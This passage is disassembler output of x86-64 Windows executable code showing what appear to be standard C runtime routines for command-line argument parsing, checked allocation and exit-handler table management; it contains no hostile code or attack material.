   140002c3b:	48 8d 40 08          	lea    0x8(%rax),%rax
   140002c3f:	48 ff c1             	inc    %rcx
   140002c42:	48 39 38             	cmp    %rdi,(%rax)
   140002c45:	75 f4                	jne    0x140002c3b
   140002c47:	89 0d e3 53 01 00    	mov    %ecx,0x153e3(%rip)        # 0x140018030
   140002c4d:	33 c9                	xor    %ecx,%ecx
   140002c4f:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140002c53:	48 89 15 de 53 01 00 	mov    %rdx,0x153de(%rip)        # 0x140018038
   140002c5a:	e8 75 2b 00 00       	call   0x1400057d4
   140002c5f:	48 8b cb             	mov    %rbx,%rcx
   140002c62:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140002c66:	e8 69 2b 00 00       	call   0x1400057d4
   140002c6b:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140002c70:	8b c7                	mov    %edi,%eax
   140002c72:	48 83 c4 30          	add    $0x30,%rsp
   140002c76:	41 5f                	pop    %r15
   140002c78:	41 5e                	pop    %r14
   140002c7a:	5f                   	pop    %rdi
   140002c7b:	5e                   	pop    %rsi
   140002c7c:	5d                   	pop    %rbp
   140002c7d:	c3                   	ret
   140002c7e:	cc                   	int3
   140002c7f:	cc                   	int3
   140002c80:	40 53                	rex push %rbx
   140002c82:	48 83 ec 20          	sub    $0x20,%rsp
   140002c86:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140002c8d:	ff ff 1f 
   140002c90:	4c 8b ca             	mov    %rdx,%r9
   140002c93:	48 3b c8             	cmp    %rax,%rcx
   140002c96:	73 3d                	jae    0x140002cd5
   140002c98:	33 d2                	xor    %edx,%edx
   140002c9a:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140002c9e:	49 f7 f0             	div    %r8
   140002ca1:	4c 3b c8             	cmp    %rax,%r9
   140002ca4:	73 2f                	jae    0x140002cd5
   140002ca6:	48 c1 e1 03          	shl    $0x3,%rcx
   140002caa:	4d 0f af c8          	imul   %r8,%r9
   140002cae:	48 8b c1             	mov    %rcx,%rax
   140002cb1:	48 f7 d0             	not    %rax
   140002cb4:	49 3b c1             	cmp    %r9,%rax
   140002cb7:	76 1c                	jbe    0x140002cd5
   140002cb9:	49 03 c9             	add    %r9,%rcx
   140002cbc:	ba 01 00 00 00       	mov    $0x1,%edx
   140002cc1:	e8 52 3a 00 00       	call   0x140006718
   140002cc6:	33 c9                	xor    %ecx,%ecx
   140002cc8:	48 8b d8             	mov    %rax,%rbx
   140002ccb:	e8 04 2b 00 00       	call   0x1400057d4
   140002cd0:	48 8b c3             	mov    %rbx,%rax
   140002cd3:	eb 02                	jmp    0x140002cd7
   140002cd5:	33 c0                	xor    %eax,%eax
   140002cd7:	48 83 c4 20          	add    $0x20,%rsp
   140002cdb:	5b                   	pop    %rbx
   140002cdc:	c3                   	ret
   140002cdd:	cc                   	int3
   140002cde:	cc                   	int3
   140002cdf:	cc                   	int3
   140002ce0:	48 8b c4             	mov    %rsp,%rax
   140002ce3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002ce7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140002ceb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140002cef:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140002cf3:	41 54                	push   %r12
   140002cf5:	41 56                	push   %r14
   140002cf7:	41 57                	push   %r15
   140002cf9:	48 83 ec 20          	sub    $0x20,%rsp
   140002cfd:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   140002d02:	4d 8b e1             	mov    %r9,%r12
   140002d05:	49 8b d8             	mov    %r8,%rbx
   140002d08:	4c 8b f2             	mov    %rdx,%r14
   140002d0b:	48 8b f9             	mov    %rcx,%rdi
   140002d0e:	49 83 27 00          	andq   $0x0,(%r15)
   140002d12:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140002d19:	48 85 d2             	test   %rdx,%rdx
   140002d1c:	74 07                	je     0x140002d25
   140002d1e:	48 89 1a             	mov    %rbx,(%rdx)
   140002d21:	49 83 c6 08          	add    $0x8,%r14
   140002d25:	40 32 ed             	xor    %bpl,%bpl
   140002d28:	80 3f 22             	cmpb   $0x22,(%rdi)
   140002d2b:	75 0f                	jne    0x140002d3c
   140002d2d:	40 84 ed             	test   %bpl,%bpl
   140002d30:	40 b6 22             	mov    $0x22,%sil
   140002d33:	40 0f 94 c5          	sete   %bpl
   140002d37:	48 ff c7             	inc    %rdi
   140002d3a:	eb 37                	jmp    0x140002d73
   140002d3c:	49 ff 07             	incq   (%r15)
   140002d3f:	48 85 db             	test   %rbx,%rbx
   140002d42:	74 07                	je     0x140002d4b
   140002d44:	8a 07                	mov    (%rdi),%al
   140002d46:	88 03                	mov    %al,(%rbx)
   140002d48:	48 ff c3             	inc    %rbx
   140002d4b:	0f be 37             	movsbl (%rdi),%esi
   140002d4e:	48 ff c7             	inc    %rdi
   140002d51:	8b ce                	mov    %esi,%ecx
   140002d53:	e8 08 4e 00 00       	call   0x140007b60
   140002d58:	85 c0                	test   %eax,%eax
   140002d5a:	74 12                	je     0x140002d6e
   140002d5c:	49 ff 07             	incq   (%r15)
   140002d5f:	48 85 db             	test   %rbx,%rbx
   140002d62:	74 07                	je     0x140002d6b
   140002d64:	8a 07                	mov    (%rdi),%al
   140002d66:	88 03                	mov    %al,(%rbx)
   140002d68:	48 ff c3             	inc    %rbx
   140002d6b:	48 ff c7             	inc    %rdi
   140002d6e:	40 84 f6             	test   %sil,%sil
   140002d71:	74 1c                	je     0x140002d8f
   140002d73:	40 84 ed             	test   %bpl,%bpl
   140002d76:	75 b0                	jne    0x140002d28
   140002d78:	40 80 fe 20          	cmp    $0x20,%sil
   140002d7c:	74 06                	je     0x140002d84
   140002d7e:	40 80 fe 09          	cmp    $0x9,%sil
   140002d82:	75 a4                	jne    0x140002d28
   140002d84:	48 85 db             	test   %rbx,%rbx
   140002d87:	74 09                	je     0x140002d92
   140002d89:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   140002d8d:	eb 03                	jmp    0x140002d92
   140002d8f:	48 ff cf             	dec    %rdi
   140002d92:	40 32 f6             	xor    %sil,%sil
   140002d95:	8a 07                	mov    (%rdi),%al
   140002d97:	84 c0                	test   %al,%al
   140002d99:	0f 84 d4 00 00 00    	je     0x140002e73
   140002d9f:	3c 20                	cmp    $0x20,%al
   140002da1:	74 04                	je     0x140002da7
   140002da3:	3c 09                	cmp    $0x9,%al
   140002da5:	75 07                	jne    0x140002dae
   140002da7:	48 ff c7             	inc    %rdi
   140002daa:	8a 07                	mov    (%rdi),%al
   140002dac:	eb f1                	jmp    0x140002d9f
   140002dae:	84 c0                	test   %al,%al
   140002db0:	0f 84 bd 00 00 00    	je     0x140002e73
   140002db6:	4d 85 f6             	test   %r14,%r14
   140002db9:	74 07                	je     0x140002dc2
   140002dbb:	49 89 1e             	mov    %rbx,(%r14)
   140002dbe:	49 83 c6 08          	add    $0x8,%r14
   140002dc2:	49 ff 04 24          	incq   (%r12)
   140002dc6:	ba 01 00 00 00       	mov    $0x1,%edx
   140002dcb:	33 c0                	xor    %eax,%eax
   140002dcd:	eb 05                	jmp    0x140002dd4
   140002dcf:	48 ff c7             	inc    %rdi
   140002dd2:	ff c0                	inc    %eax
   140002dd4:	8a 0f                	mov    (%rdi),%cl
   140002dd6:	80 f9 5c             	cmp    $0x5c,%cl
   140002dd9:	74 f4                	je     0x140002dcf
   140002ddb:	80 f9 22             	cmp    $0x22,%cl
   140002dde:	75 30                	jne    0x140002e10
   140002de0:	84 c2                	test   %al,%dl
   140002de2:	75 18                	jne    0x140002dfc
   140002de4:	40 84 f6             	test   %sil,%sil
   140002de7:	74 0a                	je     0x140002df3
   140002de9:	38 4f 01             	cmp    %cl,0x1(%rdi)
   140002dec:	75 05                	jne    0x140002df3
   140002dee:	48 ff c7             	inc    %rdi
   140002df1:	eb 09                	jmp    0x140002dfc
   140002df3:	33 d2                	xor    %edx,%edx
   140002df5:	40 84 f6             	test   %sil,%sil
   140002df8:	40 0f 94 c6          	sete   %sil
   140002dfc:	d1 e8                	shr    $1,%eax
   140002dfe:	eb 10                	jmp    0x140002e10
   140002e00:	ff c8                	dec    %eax
   140002e02:	48 85 db             	test   %rbx,%rbx
   140002e05:	74 06                	je     0x140002e0d
   140002e07:	c6 03 5c             	movb   $0x5c,(%rbx)
   140002e0a:	48 ff c3             	inc    %rbx
   140002e0d:	49 ff 07             	incq   (%r15)
   140002e10:	85 c0                	test   %eax,%eax
   140002e12:	75 ec                	jne    0x140002e00
   140002e14:	8a 07                	mov    (%rdi),%al
   140002e16:	84 c0                	test   %al,%al
   140002e18:	74 46                	je     0x140002e60
   140002e1a:	40 84 f6             	test   %sil,%sil
   140002e1d:	75 08                	jne    0x140002e27
   140002e1f:	3c 20                	cmp    $0x20,%al
   140002e21:	74 3d                	je     0x140002e60
   140002e23:	3c 09                	cmp    $0x9,%al
   140002e25:	74 39                	je     0x140002e60
   140002e27:	85 d2                	test   %edx,%edx
   140002e29:	74 2d                	je     0x140002e58
   140002e2b:	48 85 db             	test   %rbx,%rbx
   140002e2e:	74 07                	je     0x140002e37
   140002e30:	88 03                	mov    %al,(%rbx)
   140002e32:	48 ff c3             	inc    %rbx
   140002e35:	8a 07                	mov    (%rdi),%al
   140002e37:	0f be c8             	movsbl %al,%ecx
   140002e3a:	e8 21 4d 00 00       	call   0x140007b60
   140002e3f:	85 c0                	test   %eax,%eax
   140002e41:	74 12                	je     0x140002e55
   140002e43:	49 ff 07             	incq   (%r15)
   140002e46:	48 ff c7             	inc    %rdi
   140002e49:	48 85 db             	test   %rbx,%rbx
   140002e4c:	74 07                	je     0x140002e55
   140002e4e:	8a 07                	mov    (%rdi),%al
   140002e50:	88 03                	mov    %al,(%rbx)
   140002e52:	48 ff c3             	inc    %rbx
   140002e55:	49 ff 07             	incq   (%r15)
   140002e58:	48 ff c7             	inc    %rdi
   140002e5b:	e9 66 ff ff ff       	jmp    0x140002dc6
   140002e60:	48 85 db             	test   %rbx,%rbx
   140002e63:	74 06                	je     0x140002e6b
   140002e65:	c6 03 00             	movb   $0x0,(%rbx)
   140002e68:	48 ff c3             	inc    %rbx
   140002e6b:	49 ff 07             	incq   (%r15)
   140002e6e:	e9 22 ff ff ff       	jmp    0x140002d95
   140002e73:	4d 85 f6             	test   %r14,%r14
   140002e76:	74 04                	je     0x140002e7c
   140002e78:	49 83 26 00          	andq   $0x0,(%r14)
   140002e7c:	49 ff 04 24          	incq   (%r12)
   140002e80:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002e85:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140002e8a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002e8f:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140002e94:	48 83 c4 20          	add    $0x20,%rsp
   140002e98:	41 5f                	pop    %r15
   140002e9a:	41 5e                	pop    %r14
   140002e9c:	41 5c                	pop    %r12
   140002e9e:	c3                   	ret
   140002e9f:	cc                   	int3
   140002ea0:	48 85 c9             	test   %rcx,%rcx
   140002ea3:	75 04                	jne    0x140002ea9
   140002ea5:	83 c8 ff             	or     $0xffffffff,%eax
   140002ea8:	c3                   	ret
   140002ea9:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140002ead:	48 39 01             	cmp    %rax,(%rcx)
   140002eb0:	75 12                	jne    0x140002ec4
   140002eb2:	48 8b 05 7f 41 01 00 	mov    0x1417f(%rip),%rax        # 0x140017038
   140002eb9:	48 89 01             	mov    %rax,(%rcx)
   140002ebc:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002ec0:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002ec4:	33 c0                	xor    %eax,%eax
   140002ec6:	c3                   	ret
   140002ec7:	cc                   	int3
   140002ec8:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002ecd:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002ed2:	55                   	push   %rbp
   140002ed3:	48 8b ec             	mov    %rsp,%rbp
   140002ed6:	48 83 ec 40          	sub    $0x40,%rsp
   140002eda:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140002ede:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002ee2:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   140002ee6:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140002eea:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002eee:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140002ef2:	b8 02 00 00 00       	mov    $0x2,%eax
   140002ef7:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140002efb:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140002eff:	89 45 28             	mov    %eax,0x28(%rbp)
   140002f02:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140002f05:	e8 1a 03 00 00       	call   0x140003224
   140002f0a:	48 83 c4 40          	add    $0x40,%rsp
   140002f0e:	5d                   	pop    %rbp
   140002f0f:	c3                   	ret
   140002f10:	4c 8b dc             	mov    %rsp,%r11
   140002f13:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140002f17:	48 83 ec 38          	sub    $0x38,%rsp
   140002f1b:	49 8d 43 08          	lea    0x8(%r11),%rax
   140002f1f:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140002f23:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140002f27:	b8 02 00 00 00       	mov    $0x2,%eax
   140002f2c:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140002f30:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140002f34:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140002f38:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   140002f3c:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140002f40:	e8 1b 03 00 00       	call   0x140003260
   140002f45:	48 83 c4 38          	add    $0x38,%rsp
   140002f49:	c3                   	ret
   140002f4a:	cc                   	int3
   140002f4b:	cc                   	int3
   140002f4c:	48 8b d1             	mov    %rcx,%rdx
   140002f4f:	48 8d 0d 32 52 01 00 	lea    0x15232(%rip),%rcx        # 0x140018188
   140002f56:	e9 6d ff ff ff       	jmp    0x140002ec8
   140002f5b:	cc                   	int3
   140002f5c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002f61:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002f66:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002f6b:	57                   	push   %rdi
   140002f6c:	41 56                	push   %r14
   140002f6e:	41 57                	push   %r15
   140002f70:	48 83 ec 20          	sub    $0x20,%rsp
   140002f74:	48 8b 01             	mov    (%rcx),%rax
   140002f77:	33 ed                	xor    %ebp,%ebp
   140002f79:	4c 8b f9             	mov    %rcx,%r15
   140002f7c:	48 8b 18             	mov    (%rax),%rbx
   140002f7f:	48 85 db             	test   %rbx,%rbx
   140002f82:	0f 84 68 01 00 00    	je     0x1400030f0
   140002f88:	4c 8b 15 a9 40 01 00 	mov    0x140a9(%rip),%r10        # 0x140017038
   140002f8f:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   140002f93:	49 8b f2             	mov    %r10,%rsi
   140002f96:	48 33 33             	xor    (%rbx),%rsi
   140002f99:	4d 33 ca             	xor    %r10,%r9
   140002f9c:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140002fa0:	41 8b ca             	mov    %r10d,%ecx
   140002fa3:	83 e1 3f             	and    $0x3f,%ecx
   140002fa6:	49 33 da             	xor    %r10,%rbx
   140002fa9:	48 d3 cb             	ror    %cl,%rbx
   140002fac:	48 d3 ce             	ror    %cl,%rsi
   140002faf:	49 d3 c9             	ror    %cl,%r9
   140002fb2:	4c 3b cb             	cmp    %rbx,%r9
   140002fb5:	0f 85 a7 00 00 00    	jne    0x140003062
   140002fbb:	48 2b de             	sub    %rsi,%rbx
   140002fbe:	b8 00 02 00 00       	mov    $0x200,%eax
   140002fc3:	48 c1 fb 03          	sar    $0x3,%rbx
   140002fc7:	48 3b d8             	cmp    %rax,%rbx
   140002fca:	48 8b fb             	mov    %rbx,%rdi
   140002fcd:	48 0f 47 f8          	cmova  %rax,%rdi
   140002fd1:	8d 45 20             	lea    0x20(%rbp),%eax
   140002fd4:	48 03 fb             	add    %rbx,%rdi
   140002fd7:	48 0f 44 f8          	cmove  %rax,%rdi
   140002fdb:	48 3b fb             	cmp    %rbx,%rdi
   140002fde:	72 1e                	jb     0x140002ffe
   140002fe0:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   140002fe4:	48 8b d7             	mov    %rdi,%rdx
   140002fe7:	48 8b ce             	mov    %rsi,%rcx
   140002fea:	e8 fd 4b 00 00       	call   0x140007bec
   140002fef:	33 c9                	xor    %ecx,%ecx
   140002ff1:	4c 8b f0             	mov    %rax,%r14
   140002ff4:	e8 db 27 00 00       	call   0x1400057d4
   140002ff9:	4d 85 f6             	test   %r14,%r14
   140002ffc:	75 28                	jne    0x140003026
   140002ffe:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   140003002:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003008:	48 8b d7             	mov    %rdi,%rdx
   14000300b:	48 8b ce             	mov    %rsi,%rcx
   14000300e:	e8 d9 4b 00 00       	call   0x140007bec
   140003013:	33 c9                	xor    %ecx,%ecx
   140003015:	4c 8b f0             	mov    %rax,%r14
   140003018:	e8 b7 27 00 00       	call   0x1400057d4
   14000301d:	4d 85 f6             	test   %r14,%r14
   140003020:	0f 84 ca 00 00 00    	je     0x1400030f0
   140003026:	4c 8b 15 0b 40 01 00 	mov    0x1400b(%rip),%r10        # 0x140017038
   14000302d:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   140003031:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   140003035:	49 8b f6             	mov    %r14,%rsi
   140003038:	48 8b cb             	mov    %rbx,%rcx
   14000303b:	49 2b c9             	sub    %r9,%rcx
   14000303e:	48 83 c1 07          	add    $0x7,%rcx
   140003042:	48 c1 e9 03          	shr    $0x3,%rcx
   140003046:	4c 3b cb             	cmp    %rbx,%r9
   140003049:	48 0f 47 cd          	cmova  %rbp,%rcx
   14000304d:	48 85 c9             	test   %rcx,%rcx
   140003050:	74 10                	je     0x140003062
   140003052:	49 8b c2             	mov    %r10,%rax
   140003055:	49 8b f9             	mov    %r9,%rdi
   140003058:	f3 48 ab             	rep stos %rax,(%rdi)
   14000305b:	4c 8b 15 d6 3f 01 00 	mov    0x13fd6(%rip),%r10        # 0x140017038
   140003062:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140003068:	49 8d 79 08          	lea    0x8(%r9),%rdi
   14000306c:	41 8b c8             	mov    %r8d,%ecx
   14000306f:	41 8b c2             	mov    %r10d,%eax
   140003072:	83 e0 3f             	and    $0x3f,%eax
   140003075:	2b c8                	sub    %eax,%ecx
   140003077:	49 8b 47 08          	mov    0x8(%r15),%rax
   14000307b:	48 8b 10             	mov    (%rax),%rdx
   14000307e:	41 8b c0             	mov    %r8d,%eax
   140003081:	48 d3 ca             	ror    %cl,%rdx
   140003084:	49 33 d2             	xor    %r10,%rdx
   140003087:	49 89 11             	mov    %rdx,(%r9)
   14000308a:	48 8b 15 a7 3f 01 00 	mov    0x13fa7(%rip),%rdx        # 0x140017038
   140003091:	8b ca                	mov    %edx,%ecx
   140003093:	83 e1 3f             	and    $0x3f,%ecx
   140003096:	2b c1                	sub    %ecx,%eax
   140003098:	8a c8                	mov    %al,%cl
   14000309a:	49 8b 07             	mov    (%r15),%rax
   14000309d:	48 d3 ce             	ror    %cl,%rsi
   1400030a0:	48 33 f2             	xor    %rdx,%rsi
   1400030a3:	48 8b 08             	mov    (%rax),%rcx
   1400030a6:	48 89 31             	mov    %rsi,(%rcx)
   1400030a9:	41 8b c8             	mov    %r8d,%ecx
   1400030ac:	48 8b 15 85 3f 01 00 	mov    0x13f85(%rip),%rdx        # 0x140017038
   1400030b3:	8b c2                	mov    %edx,%eax
   1400030b5:	83 e0 3f             	and    $0x3f,%eax
   1400030b8:	2b c8                	sub    %eax,%ecx
   1400030ba:	49 8b 07             	mov    (%r15),%rax
   1400030bd:	48 d3 cf             	ror    %cl,%rdi
   1400030c0:	48 33 fa             	xor    %rdx,%rdi
   1400030c3:	48 8b 10             	mov    (%rax),%rdx
   1400030c6:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   1400030ca:	48 8b 15 67 3f 01 00 	mov    0x13f67(%rip),%rdx        # 0x140017038
   1400030d1:	8b c2                	mov    %edx,%eax
   1400030d3:	83 e0 3f             	and    $0x3f,%eax
   1400030d6:	44 2b c0             	sub    %eax,%r8d
   1400030d9:	49 8b 07             	mov    (%r15),%rax
   1400030dc:	41 8a c8             	mov    %r8b,%cl
   1400030df:	48 d3 cb             	ror    %cl,%rbx
   1400030e2:	48 33 da             	xor    %rdx,%rbx
   1400030e5:	48 8b 08             	mov    (%rax),%rcx
   1400030e8:	33 c0                	xor    %eax,%eax
   1400030ea:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1400030ee:	eb 03                	jmp    0x1400030f3
   1400030f0:	83 c8 ff             	or     $0xffffffff,%eax
   1400030f3:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400030f8:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1400030fd:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140003102:	48 83 c4 20          	add    $0x20,%rsp
   140003106:	41 5f                	pop    %r15
   140003108:	41 5e                	pop    %r14
   14000310a:	5f                   	pop    %rdi
   14000310b:	c3                   	ret
   14000310c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003111:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003116:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000311b:	57                   	push   %rdi
   14000311c:	41 56                	push   %r14
   14000311e:	41 57                	push   %r15
   140003120:	48 83 ec 20          	sub    $0x20,%rsp
   140003124:	48 8b 01             	mov    (%rcx),%rax
   140003127:	48 8b f1             	mov    %rcx,%rsi
   14000312a:	48 8b 18             	mov    (%rax),%rbx
   14000312d:	48 85 db             	test   %rbx,%rbx
   140003130:	75 08                	jne    0x14000313a
   140003132:	83 c8 ff             	or     $0xffffffff,%eax
   140003135:	e9 cf 00 00 00       	jmp    0x140003209
   14000313a:	4c 8b 05 f7 3e 01 00 	mov    0x13ef7(%rip),%r8        # 0x140017038
   140003141:	41 8b c8             	mov    %r8d,%ecx
   140003144:	49 8b f8             	mov    %r8,%rdi
   140003147:	48 33 3b             	xor    (%rbx),%rdi
   14000314a:	83 e1 3f             	and    $0x3f,%ecx
   14000314d:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140003151:	48 d3 cf             	ror    %cl,%rdi
   140003154:	49 33 d8             	xor    %r8,%rbx
   140003157:	48 d3 cb             	ror    %cl,%rbx
   14000315a:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   14000315e:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140003162:	0f 87 9f 00 00 00    	ja     0x140003207
   140003168:	41 8b c8             	mov    %r8d,%ecx
   14000316b:	4d 8b f0             	mov    %r8,%r14
   14000316e:	83 e1 3f             	and    $0x3f,%ecx
   140003171:	4c 8b ff             	mov    %rdi,%r15
   140003174:	48 8b eb             	mov    %rbx,%rbp
   140003177:	48 83 eb 08          	sub    $0x8,%rbx
   14000317b:	48 3b df             	cmp    %rdi,%rbx
   14000317e:	72 55                	jb     0x1400031d5
   140003180:	48 8b 03             	mov    (%rbx),%rax
   140003183:	49 3b c6             	cmp    %r14,%rax
   140003186:	74 ef                	je     0x140003177
   140003188:	49 33 c0             	xor    %r8,%rax
   14000318b:	4c 89 33             	mov    %r14,(%rbx)
   14000318e:	48 d3 c8             	ror    %cl,%rax
   140003191:	ff 15 79 6e 01 00    	call   *0x16e79(%rip)        # 0x14001a010
   140003197:	4c 8b 05 9a 3e 01 00 	mov    0x13e9a(%rip),%r8        # 0x140017038
   14000319e:	48 8b 06             	mov    (%rsi),%rax
   1400031a1:	41 8b c8             	mov    %r8d,%ecx
   1400031a4:	83 e1 3f             	and    $0x3f,%ecx
   1400031a7:	48 8b 10             	mov    (%rax),%rdx
   1400031aa:	4c 8b 0a             	mov    (%rdx),%r9
   1400031ad:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400031b1:	4d 33 c8             	xor    %r8,%r9
   1400031b4:	49 33 c0             	xor    %r8,%rax
   1400031b7:	49 d3 c9             	ror    %cl,%r9
   1400031ba:	48 d3 c8             	ror    %cl,%rax
   1400031bd:	4d 3b cf             	cmp    %r15,%r9
   1400031c0:	75 05                	jne    0x1400031c7
   1400031c2:	48 3b c5             	cmp    %rbp,%rax
   1400031c5:	74 b0                	je     0x140003177
   1400031c7:	4d 8b f9             	mov    %r9,%r15
   1400031ca:	49 8b f9             	mov    %r9,%rdi
   1400031cd:	48 8b e8             	mov    %rax,%rbp
   1400031d0:	48 8b d8             	mov    %rax,%rbx
   1400031d3:	eb a2                	jmp    0x140003177
   1400031d5:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1400031d9:	74 0f                	je     0x1400031ea
   1400031db:	48 8b cf             	mov    %rdi,%rcx
   1400031de:	e8 f1 25 00 00       	call   0x1400057d4
   1400031e3:	4c 8b 05 4e 3e 01 00 	mov    0x13e4e(%rip),%r8        # 0x140017038
   1400031ea:	48 8b 06             	mov    (%rsi),%rax
   1400031ed:	48 8b 08             	mov    (%rax),%rcx
   1400031f0:	4c 89 01             	mov    %r8,(%rcx)
   1400031f3:	48 8b 06             	mov    (%rsi),%rax
   1400031f6:	48 8b 08             	mov    (%rax),%rcx
   1400031f9:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   1400031fd:	48 8b 06             	mov    (%rsi),%rax
   140003200:	48 8b 08             	mov    (%rax),%rcx
   140003203:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140003207:	33 c0                	xor    %eax,%eax
   140003209:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000320e:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003213:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003218:	48 83 c4 20          	add    $0x20,%rsp
   14000321c:	41 5f                	pop    %r15
   14000321e:	41 5e                	pop    %r14
   140003220:	5f                   	pop    %rdi
   140003221:	c3                   	ret
   140003222:	cc                   	int3
   140003223:	cc                   	int3
   140003224:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003229:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000322e:	57                   	push   %rdi
   14000322f:	48 83 ec 20          	sub    $0x20,%rsp
   140003233:	49 8b d9             	mov    %r9,%rbx
   140003236:	49 8b f8             	mov    %r8,%rdi
   140003239:	8b 0a                	mov    (%rdx),%ecx
   14000323b:	e8 a0 11 00 00       	call   0x1400043e0
   140003240:	90                   	nop
   140003241:	48 8b cf             	mov    %rdi,%rcx
   140003244:	e8 13 fd ff ff       	call   0x140002f5c
   140003249:	8b f8                	mov    %eax,%edi
   14000324b:	8b 0b                	mov    (%rbx),%ecx
   14000324d:	e8 aa 11 00 00       	call   0x1400043fc
   140003252:	8b c7                	mov    %edi,%eax
   140003254:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003259:	48 83 c4 20          	add    $0x20,%rsp
   14000325d:	5f                   	pop    %rdi
   14000325e:	c3                   	ret
   14000325f:	cc                   	int3
   140003260:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003265:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000326a:	57                   	push   %rdi
   14000326b:	48 83 ec 20          	sub    $0x20,%rsp
   14000326f:	49 8b d9             	mov    %r9,%rbx
   140003272:	49 8b f8             	mov    %r8,%rdi
   140003275:	8b 0a                	mov    (%rdx),%ecx
   140003277:	e8 64 11 00 00       	call   0x1400043e0
   14000327c:	90                   	nop
   14000327d:	48 8b cf             	mov    %rdi,%rcx
   140003280:	e8 87 fe ff ff       	call   0x14000310c
   140003285:	8b f8                	mov    %eax,%edi
   140003287:	8b 0b                	mov    (%rbx),%ecx
   140003289:	e8 6e 11 00 00       	call   0x1400043fc
   14000328e:	8b c7                	mov    %edi,%eax
   140003290:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003295:	48 83 c4 20          	add    $0x20,%rsp
   140003299:	5f                   	pop    %rdi
   14000329a:	c3                   	ret
   14000329b:	cc                   	int3
   14000329c:	e9 c7 00 00 00       	jmp    0x140003368
   1400032a1:	cc                   	int3
   1400032a2:	cc                   	int3
   1400032a3:	cc                   	int3
   1400032a4:	48 83 ec 28          	sub    $0x28,%rsp
   1400032a8:	48 8b 05 21 4f 01 00 	mov    0x14f21(%rip),%rax        # 0x1400181d0
   1400032af:	48 85 c0             	test   %rax,%rax
   1400032b2:	75 39                	jne    0x1400032ed
   1400032b4:	48 8b 05 fd 4e 01 00 	mov    0x14efd(%rip),%rax        # 0x1400181b8
   1400032bb:	48 85 c0             	test   %rax,%rax
   1400032be:	75 26                	jne    0x1400032e6
   1400032c0:	48 39 05 f9 4e 01 00 	cmp    %rax,0x14ef9(%rip)        # 0x1400181c0
   1400032c7:	75 04                	jne    0x1400032cd
   1400032c9:	33 c0                	xor    %eax,%eax
   1400032cb:	eb 19                	jmp    0x1400032e6
   1400032cd:	e8 96 00 00 00       	call   0x140003368
   1400032d2:	85 c0                	test   %eax,%eax
   1400032d4:	74 09                	je     0x1400032df
   1400032d6:	e8 7d 02 00 00       	call   0x140003558
